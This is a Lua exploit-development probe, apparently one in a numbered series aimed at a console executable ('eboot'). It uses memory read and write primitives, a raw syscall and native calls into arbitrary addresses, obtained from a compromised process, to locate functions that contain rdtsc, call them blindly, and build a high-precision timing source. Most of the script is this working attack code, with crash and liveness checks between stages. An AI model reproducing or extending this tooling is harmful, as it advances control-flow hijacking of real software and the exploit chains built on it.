-- CRASH_CLASS: MODERATE
-- PROBE 390e: Find callable functions containing rdtsc
--
-- Context: 390c found zero rdtsc;ret gadgets. But eboot has 44 rdtsc hits
-- inside real functions. If we find the function entry, we can call it
-- and get TSC values for timing. Strategy:
-- 1. Read 256 bytes backward from each rdtsc to find function prologues
-- 2. Try calling the entry via fcall_with_rax
-- 3. Check if return value looks like TSC (large, increasing)

print("=== PROBE 390e: rdtsc function finder ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

local info = memory.alloc(0x200)
zero_buf(info, 0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eboot = rd(N(info) + 0x108) or 0
print(string.format("eboot: 0x%X", eboot))

-- rdtsc offsets from 390b (all 44, first 30 printed)
-- Group by unique byte pattern
local rdtsc_offsets = {
    0xCF580,   -- 45C9310F 0FEBC031 — has LEAVE after rdtsc!
    0x19BBD0,  -- 48C0310F 5B20C483 — possible function epilogue
    0x2767B8,  -- 31D2310F F9014DC0 — interesting
    0x2768E3,  -- 48C0310F 8548098B
    0x27693B,  -- 48C0310F 8548328B
    0xF71B1,   -- 89C9310F 44C6FFF0
    0x11CD16,  -- 41C0310F 5A8BB60F
    0x120CB1,  -- 41C0310F 248CB60F
    0x13E68E,  -- 66C9310F 66666666 — has NOP padding after
    0x14317D,  -- C5C9310F E08011FC
    0x17C42,   -- 4CF6310F C148F789 (common pattern, 11 copies)
    0x6A109,   -- C3C0310F 01518D48 (false positive C3)
    0x1CAEE0,  -- E9F6310F 000000FC — has JMP after
    0x1CE0BA,  -- E9DB310F 000007A1 — has JMP after
}

-- ===================================================================
-- [A] Read 64B context at each hit, search for function prologue
-- ===================================================================
print("[A] function search")

local SEARCH_BACK = 256
local prologue_pat = string.char(0x55, 0x48, 0x89, 0xE5)  -- push rbp; mov rbp, rsp
local prologue2 = string.char(0x55, 0x41, 0x57)  -- push rbp; push r15
local prologue3 = string.char(0x48, 0x89, 0x5C, 0x24)  -- mov [rsp+X], rbx (MSVC-like)

local candidates = {}

for _, off in ipairs(rdtsc_offsets) do
    if not alive() then break end

    local rdtsc_addr = eboot + off

    -- Read 256 bytes before
    local start = rdtsc_addr - SEARCH_BACK
    if start < eboot then start = eboot end
    local len = rdtsc_addr - start

    local ok, before = pcall(function() return memory.read_buffer(start, len) end)
    if not ok or type(before) ~= "string" then
        print(string.format("  +0x%X: cant read before", off))
    else
        -- Search for prologues, find the LAST one (closest to rdtsc)
        local best_pos = nil
        local best_type = nil

        -- Standard push rbp; mov rbp, rsp
        local pos = 1
        while true do
            local f = string.find(before, prologue_pat, pos, true)
            if not f then break end
            best_pos = f
            best_type = "55 48 89 E5"
            pos = f + 1
        end

        -- Also search for just CC 55 (int3; push rbp) which marks function boundaries
        local cc_pat = string.char(0xCC, 0x55)
        pos = 1
        while true do
            local f = string.find(before, cc_pat, pos, true)
            if not f then break end
            if not best_pos or f + 1 > best_pos then
                best_pos = f + 1  -- skip the CC, function starts at 55
                best_type = "CC 55"
            end
            pos = f + 1
        end

        -- Search for 90 90 55 (nop padding; push rbp)
        local nop_pat = string.char(0x90, 0x90, 0x55)
        pos = 1
        while true do
            local f = string.find(before, nop_pat, pos, true)
            if not f then break end
            if not best_pos or f + 2 > best_pos then
                best_pos = f + 2  -- function starts at 55
                best_type = "90 90 55"
            end
            pos = f + 1
        end

        if best_pos then
            local entry_addr = start + best_pos - 1
            local dist = rdtsc_addr - entry_addr
            print(string.format("  +0x%X: prologue '%s' at -%d bytes (entry eboot+0x%X)",
                off, best_type, dist, entry_addr - eboot))
            candidates[#candidates + 1] = {
                rdtsc_off = off,
                entry = entry_addr,
                dist = dist,
                ptype = best_type
            }
        else
            print(string.format("  +0x%X: no prologue in %dB", off, len))
        end
    end
end

if not alive() then print("DEAD after [A]"); return end
print(string.format("  found %d function candidates", #candidates))
print("")

-- ===================================================================
-- [B] Read 32 bytes at each rdtsc for detailed disasm context
-- ===================================================================
print("[B] rdtsc context (32 bytes)")

for _, off in ipairs({0xCF580, 0x19BBD0, 0x13E68E, 0x2767B8}) do
    if not alive() then break end
    local addr = eboot + off
    local ok, chunk = pcall(function() return memory.read_buffer(addr, 32) end)
    if ok and type(chunk) == "string" then
        local hex = {}
        for i = 1, math.min(#chunk, 32) do
            hex[#hex + 1] = string.format("%02X", string.byte(chunk, i))
        end
        -- Find C3 positions
        local rets = {}
        for i = 3, #chunk do
            if string.byte(chunk, i) == 0xC3 then
                rets[#rets + 1] = tostring(i - 1)
            end
        end
        local ret_str = #rets > 0 and (" C3@" .. table.concat(rets, ",")) or ""
        print(string.format("  +0x%X: %s%s", off, table.concat(hex, " "), ret_str))
    end
end

if not alive() then print("DEAD after [B]"); return end
print("")

-- ===================================================================
-- [C] Try calling each candidate function, check for TSC-like return
-- ===================================================================
print("[C] function call test")

-- Sort by distance (shorter = more likely the actual function)
table.sort(candidates, function(a, b) return a.dist < b.dist end)

local tsc_funcs = {}

for i, c in ipairs(candidates) do
    if i > 12 then break end  -- test top 12
    if not alive() then break end

    local ok, rv = pcall(function()
        return native.fcall_with_rax(uint64(c.entry), 0)
    end)

    if ok then
        local val = N(rv)
        -- Call again to check if increasing
        local ok2, rv2 = pcall(function()
            return native.fcall_with_rax(uint64(c.entry), 0)
        end)
        local val2 = ok2 and N(rv2) or 0

        local delta = val2 - val
        local is_tsc = (val > 1000000 and delta > 0 and delta < 10000000)
        local tag = is_tsc and " *** TSC CANDIDATE ***" or ""

        print(string.format("  eboot+0x%X (rdtsc@+0x%X dist=%d): v1=%d v2=%d d=%d%s",
            c.entry - eboot, c.rdtsc_off, c.dist, val, val2, delta, tag))

        if is_tsc then
            tsc_funcs[#tsc_funcs + 1] = c
        end
    else
        print(string.format("  eboot+0x%X (rdtsc@+0x%X): CRASHED", c.entry - eboot, c.rdtsc_off))
        if not alive() then
            print("  PROCESS DEAD")
            break
        end
    end
end

if not alive() then print("DEAD after [C]"); return end
print("")

-- ===================================================================
-- [D] If we found a TSC function, measure precision
-- ===================================================================
if #tsc_funcs > 0 then
    print("[D] TSC precision test")

    local best = tsc_funcs[1]
    local func_addr = best.entry
    print(string.format("  using eboot+0x%X", func_addr - eboot))

    local samples = {}
    for i = 1, 20 do
        local a = N(native.fcall_with_rax(uint64(func_addr), 0))
        local b = N(native.fcall_with_rax(uint64(func_addr), 0))
        samples[#samples + 1] = b - a
    end

    local min_d, max_d, sum_d = samples[1], samples[1], 0
    for _, s in ipairs(samples) do
        if s < min_d then min_d = s end
        if s > max_d then max_d = s end
        sum_d = sum_d + s
    end
    print(string.format("  20 deltas: min=%d max=%d avg=%d", min_d, max_d, math.floor(sum_d / 20)))

    -- Quick stability check
    local stable = 0
    for _, s in ipairs(samples) do
        if s > 0 and s < 100000 then stable = stable + 1 end
    end
    print(string.format("  stable samples (0-100K): %d/20", stable))
else
    print("[D] no TSC function found")

    -- Fallback: try calling at rdtsc addresses directly (might survive)
    print("  fallback: raw rdtsc addresses")
    for _, off in ipairs({0xCF580, 0x13E68E, 0x19BBD0}) do
        if not alive() then break end
        local addr = eboot + off
        local ok, rv = pcall(function()
            return native.fcall_with_rax(uint64(addr), 0)
        end)
        if ok then
            local v1 = N(rv)
            local ok2, rv2 = pcall(function()
                return native.fcall_with_rax(uint64(addr), 0)
            end)
            local v2 = ok2 and N(rv2) or 0
            print(string.format("  +0x%X: v1=%d v2=%d d=%d", off, v1, v2, v2 - v1))
        else
            print(string.format("  +0x%X: CRASHED", off))
            if not alive() then print("  DEAD"); break end
        end
    end
end

if not alive() then print("DEAD after [D]"); return end
print("")

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 390e COMPLETE ===")
